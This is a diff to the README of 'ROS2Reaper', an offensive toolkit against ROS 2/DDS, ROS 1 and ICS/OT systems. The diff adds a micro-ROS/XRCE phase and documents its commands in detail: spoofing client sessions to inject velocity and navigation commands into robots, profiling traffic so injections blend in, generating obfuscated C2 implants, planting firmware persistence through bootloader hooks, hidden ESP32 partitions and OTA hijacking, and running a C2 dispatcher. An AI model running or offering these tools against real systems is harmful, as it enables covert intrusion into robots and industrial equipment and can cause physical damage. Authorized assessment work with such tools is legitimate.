@@ -9,10 +9,10 @@
   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
 ```
 
-**DDS/RTPS + ROS 1 + ICS/OT Bridge Offensive Security Assessment Framework**
+**DDS/RTPS + ROS 1 + ICS/OT Bridge + micro-ROS/XRCE Offensive Security Assessment Framework**
 
-> Author: Gh057x | v0.4.0-alpha
-> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT)
+> Author: Gh057x | v0.5.0-alpha
+> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT) · micro-ROS (XRCE / DDS-XRCE, Arduino, STM32, ESP32, nRF52)
 
 ---
 
@@ -33,13 +33,15 @@
 
 ROS2Reaper is a modular offensive security toolkit for assessing ROS 2 and ROS 1 robotic deployments. It targets the underlying DDS/RTPS transport layer — the communication backbone of ROS 2 — as well as the legacy ROS 1 rosmaster XML-RPC interface.
 
-The framework is split into three phases:
+The framework is split into five phases:
 
 | Phase | Description |
 |-------|-------------|
 | **Phase 1 — Reconnaissance** | Passive/active discovery, fingerprinting, enumeration, and security auditing |
 | **Phase 2 — Exploitation** | Topic injection, node impersonation, RTPS amplification, and parameter manipulation |
 | **Phase 3 — ICS/OT Bridge Analysis** | Attack surface analysis for DDS bridges to Modbus, DNP3, OPC UA, MQTT, EtherCAT, and AWS IoT Greengrass |
+| **Phase 4 — Post-Exploitation / C2** | Covert DDS command-and-control channel, beacon implant, and data exfiltration |
+| **Phase 5A — micro-ROS / XRCE** | XRCE Agent discovery, traffic profiling, client hijacking, implant generation, firmware persistence, and C2 dispatching for embedded micro-ROS targets |
 
 ---
 
@@ -65,13 +67,20 @@ ros2reaper_framework/
     ├── ros1_injection.py      # ROS1 TCPROS topic injection
     ├── ros1_exploitation.py   # ROS1 node killing & parameter manipulation
     ├── ros1_audit.py          # ROS1 security configuration auditing
-    └── phase3/
-        ├── ics_dds_enum.py        # ICS/OT context-aware DDS enumeration
-        ├── modbus_dnp3_bridge.py  # Modbus/DNP3 ↔ DDS bridge analysis
-        ├── mqtt_ethercat_bridge.py # MQTT/EtherCAT ↔ DDS bridge analysis
-        ├── opcua_dds_bridge.py    # OPC UA ↔ DDS bridge analysis
-        ├── aws_iot_bridge.py      # AWS IoT Greengrass ↔ DDS bridge analysis
-        └── shodan_dds.py          # Internet-wide DDS exposure via Shodan
+    ├── phase3/
+    │   ├── ics_dds_enum.py        # ICS/OT context-aware DDS enumeration
+    │   ├── modbus_dnp3_bridge.py  # Modbus/DNP3 ↔ DDS bridge analysis
+    │   ├── mqtt_ethercat_bridge.py # MQTT/EtherCAT ↔ DDS bridge analysis
+    │   ├── opcua_dds_bridge.py    # OPC UA ↔ DDS bridge analysis
+    │   ├── aws_iot_bridge.py      # AWS IoT Greengrass ↔ DDS bridge analysis
+    │   └── shodan_dds.py          # Internet-wide DDS exposure via Shodan
+    └── phase5a/
+        ├── microros_agent.py      # XRCE Agent discovery & participant enumeration
+        ├── xrce_traffic_analysis.py # XRCE traffic capture & behavioral profiling
+        ├── microros_client_hijack.py # XRCE client spoofing & topic injection
+        ├── microros_implant.py    # C2 implant source generator (C++/Arduino/Python)
+        ├── microros_persistence.py # Firmware-level persistence mechanisms
+        └── c2_dispatcher.py       # Operator C2 dispatcher for implants/agents
 ```
 
 ---
@@ -498,6 +507,237 @@ python3 ros2reaper.py modbus-scan --network 10.0.0.0/24 --deep -o modbus.json --
 python3 ros2reaper.py mqtt-scan   --network 10.0.0.0/24 --deep -o mqtt.json   --skip-auth
 python3 ros2reaper.py opcua-scan  --network 10.0.0.0/24 --deep -o opcua.json  --skip-auth
 python3 ros2reaper.py aws-scan    --network 10.0.0.0/24 --deep -o aws.json    --skip-auth
+```
+
+---
+
+## Phase 5A — micro-ROS / XRCE
+
+> No ROS installation required. All Phase 5A modules operate at the raw UDP/socket level using the XRCE wire format.
+
+Phase 5A targets embedded micro-ROS deployments — constrained MCU-based nodes (Arduino, STM32, ESP32, nRF52) that communicate via the DDS-XRCE (eXtremely Resource Constrained Environments) protocol through a micro-ROS Agent bridge.
+
+**XRCE default ports:** UDP/8888 (standard), UDP/7400–7409 (alternative instances)
+
+**Phase 5A options:**
+
+| Flag | Description |
+|------|-------------|
+| `--agent-port` | XRCE Agent UDP port (default: 8888) |
+| `--xrce-multiport` | Scan common XRCE ports (8888, 7400–7409) |
+| `--xrce-enumerate` | Enumerate micro-ROS participants on discovered agents |
+| `--xrce-attack` | Hijack attack type: `twist`, `nav`, `raw` |
+| `--xrce-session` | Spoofed session ID in hex (default: 0x42) |
+| `--pcap` | Export captured XRCE traffic to PCAP file |
+| `--theta` | Nav goal orientation in radians (default: 0.0) |
+| `--interval` | Delay between injections in seconds (default: 0.1) |
+| `--payload-file` | Raw XRCE payload file (hex text) for raw injection |
+| `--payload-hex` | Raw XRCE payload as hex string |
+| `--platform` | Implant platform: `cpp`, `arduino`, `python` |
+| `--implant-id` | Implant ID (auto-generated if omitted) |
+| `--beacon-interval` | Implant beacon interval in ms (default: 5000) |
+| `--beacon-topic` | Beacon topic base (default: `/implant/beacon`) |
+| `--command-topic` | Command topic base (default: `/implant/command`) |
+| `--obfuscate` | Strip comments from generated implant source |
+| `--add-decoy` | Add decoy code to generated implant |
+| `--manifest` | Export implant generation manifest to JSON |
+| `--persist-method` | Persistence method: `library_patch`, `bootloader`, `firmware_inject`, `partition`, `ota_hijack` |
+| `--implant-file` | Binary file with implant shellcode for persistence |
+| `--implant-hex` | Implant shellcode as hex string |
+| `--hook-address` | Bootloader hook address (hex, e.g. `0x08000100`) |
+| `--partition-name` | Partition name for ESP32 partition hijack |
+| `--ota-server` | OTA server for hijack config generation |
+| `--dispatcher-port` | Phase 5A dispatcher callback port |
+| `--beacon-timeout` | Implant beacon timeout in seconds (default: 60.0) |
+| `--log-file` | Dispatcher log file path |
+| `--export-session` | Export dispatcher session state to JSON |
+| `--batch-file` | Run dispatcher commands from file (non-interactive) |
+
+---
+
+### `microros-agent` — XRCE Agent Discovery & Enumeration
+
+Probes for XRCE Agents using minimal HEARTBEAT packets and fingerprints vendor/version from responses. Optionally enumerates connected micro-ROS participants (MCU clients).
+
+```bash
+# Single target
+python3 ros2reaper.py microros-agent --target 10.0.0.5 --skip-auth
+
+# Network sweep
+python3 ros2reaper.py microros-agent --network 10.0.0.0/24 --skip-auth -o agents.json
+
+# Scan all common XRCE ports on a single host
+python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-multiport --skip-auth
+
+# Discover agents + enumerate connected MCU participants
+python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-enumerate --skip-auth
+
+# Custom XRCE port
+python3 ros2reaper.py microros-agent --target 10.0.0.5 --agent-port 7400 --skip-auth
+```
+
+---
+
+### `xrce-traffic` — XRCE Traffic Analysis & Behavioral Profiling
+
+Captures live XRCE traffic and builds a behavioral baseline: packet size distributions, inter-packet timing, heartbeat intervals, QoS patterns, and per-session/stream statistics. Used to time and size subsequent injections to blend with normal traffic.
+
+```bash
+# 30-second capture baseline
+python3 ros2reaper.py xrce-traffic --target 10.0.0.5 --duration 30 --skip-auth
+
+# Longer capture with JSON + PCAP export
+python3 ros2reaper.py xrce-traffic --target 10.0.0.5 --agent-port 8888 \
+    --duration 60 -o baseline.json --pcap capture.pcap --skip-auth -v
+```
+
+---
+
+### `xrce-hijack` — XRCE Client Hijacking & Command Injection
+
+Creates a spoofed XRCE client session against a discovered Agent and injects malicious DDS messages. Supports Twist (velocity), PoseStamped (navigation goal), and raw CDR payload injection.
+
+| Mode | Description |
+|------|-------------|
+| `twist` | Inject `geometry_msgs/Twist` — robot velocity control |
+| `nav` | Inject `geometry_msgs/PoseStamped` — navigation goal |
+| `raw` | Inject arbitrary CDR-encoded payload from hex or file |
+
+```bash
+# Inject cmd_vel spin (default topic /cmd_vel)
+python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack twist \
+    --lx 0.5 --az 1.0 --count 20 --interval 0.1 --skip-auth
+
+# Navigate robot to coordinates
+python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack nav \
+    --topic /move_base_simple/goal --x 15.0 --y 8.0 --skip-auth
+
+# Raw payload injection (custom CDR message)
+python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack raw \
+    --topic /cmd_vel --payload-hex 0000803f000000000000000000000000000000000000803f \
+    --count 5 --skip-auth
+
+# Use specific session ID and custom port
+python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --agent-port 7400 \
+    --xrce-session 0x81 --xrce-attack twist --lx 2.0 --skip-auth
+```
+
+---
+
+### `uros-implant` — micro-ROS C2 Implant Generation
+
+Generates complete micro-ROS C2 implant source code from templates. The implant beacons periodically to a C2 callback topic and accepts tasking commands over DDS. Supports three target platforms.
+
+| Platform | Output | Use case |
+|----------|--------|----------|
+| `cpp` | `.cpp` (ROS 2 node) | Full ROS 2 host or cross-compiled MCU |
+| `arduino` | `.ino` (Arduino sketch) | Arduino-compatible boards with Ethernet/WiFi |
+| `python` | `.py` (rclpy node) | Rapid prototyping / testing |
+
+```bash
+# Generate Python implant (lab testing)
+python3 ros2reaper.py uros-implant --platform python --skip-auth
+
+# Generate Arduino implant with custom beacon interval
+python3 ros2reaper.py uros-implant --platform arduino \
+    --implant-id sensor_node_01 --beacon-interval 3000 --skip-auth
+
+# Generate C++ implant with obfuscation + manifest
+python3 ros2reaper.py uros-implant --platform cpp --obfuscate --add-decoy \
+    --beacon-interval 10000 --manifest implants.json --skip-auth
+```
+
+---
+
+### `uros-persist` — Firmware-Level Persistence
+
+Establishes persistent implant presence at the firmware level. Generates patched firmware images, bootloader hooks, partition table modifications, or OTA hijack configurations.
+
+| Method | Survives | Notes |
+|--------|----------|-------|
+| `library_patch` | App reinstalls | Injects beacon into micro-ROS client library |
+| `bootloader` | OS wipe | Hooks bootloader to run implant before firmware |
+| `firmware_inject` | Normal updates | Appends implant to firmware image |
+| `partition` | Factory reset | Creates hidden partition in ESP32 partition table |
+| `ota_hijack` | Updates (MITM) | Generates config for serving malicious OTA firmware |
+
+```bash
+# Library patch (micro-ROS .elf firmware)
+python3 ros2reaper.py uros-persist --persist-method library_patch \
+    --target firmware.elf --implant-id sensor_01 \
+    --implant-hex deadbeef... --skip-auth -o persist.json
+
+# ESP32 partition hijack
+python3 ros2reaper.py uros-persist --persist-method partition \
+    --target partitions.csv --implant-id sensor_01 \
+    --implant-file implant.bin --partition-name implant_hidden --skip-auth
+
+# OTA hijack config generation
+python3 ros2reaper.py uros-persist --persist-method ota_hijack \
+    --implant-id sensor_01 --ota-server ota.target.local --skip-auth
+
+# Bootloader hook with specific hook address
+python3 ros2reaper.py uros-persist --persist-method bootloader \
+    --target bootloader.elf --implant-id sensor_01 \
+    --implant-file implant.bin --hook-address 0x08000100 --skip-auth
+```
+
+---
+
+### `uros-c2` — Phase 5A C2 Dispatcher
+
+Interactive operator console that routes commands to deployed micro-ROS implants (via DDS topics) or live XRCE Agents (via Module 3 hijacking). Tracks the implant registry, manages task queues, and aggregates telemetry.
+
+```bash
+# Start interactive dispatcher
+python3 ros2reaper.py uros-c2 --skip-auth
+
+# With C2 callback and logging
+python3 ros2reaper.py uros-c2 --target 10.0.0.1 --dispatcher-port 9999 \
+    --beacon-timeout 120 --log-file dispatcher.log --skip-auth
+
+# Batch mode — run commands from file
+python3 ros2reaper.py uros-c2 --batch-file tasks.txt \
+    --export-session session.json --skip-auth
+```
+
+**Dispatcher commands (interactive console):**
+
+```
+[dispatcher]> action uros_abc123 inject_twist lx=2.0 az=1.0
+[dispatcher]> action uros_abc123 inject_nav x=10.0 y=5.0
+[dispatcher]> action 10.0.0.5 inject_twist lx=5.0 port=8888
+[dispatcher]> status implants
+[dispatcher]> status implants uros_abc123
+[dispatcher]> status tasks
+[dispatcher]> help
+```
+
+---
+
+### Phase 5A Pipeline
+
+Full micro-ROS assessment and exploitation workflow:
+
+```bash
+# 1. Discover XRCE Agents on the subnet
+python3 ros2reaper.py microros-agent --network 10.0.0.0/24 \
+    --xrce-enumerate -o agents.json --skip-auth
+
+# 2. Build behavioral baseline (30s passive capture)
+python3 ros2reaper.py xrce-traffic --target 10.0.0.5 \
+    --duration 30 -o baseline.json --pcap xrce.pcap --skip-auth
+
+# 3. Hijack session and inject velocity command
+python3 ros2reaper.py xrce-hijack --target 10.0.0.5 \
+    --xrce-attack twist --lx 1.5 --az 0.5 --count 10 --skip-auth
+
+# 4. Generate persistent implant
+python3 ros2reaper.py uros-implant --platform python \
+    --implant-id lab_node_01 --beacon-interval 5000 --skip-auth
+
+# 5. Start C2 dispatcher and receive implant beacons
+python3 ros2reaper.py uros-c2 --log-file lab_session.log --skip-auth
 ```
 
 ---
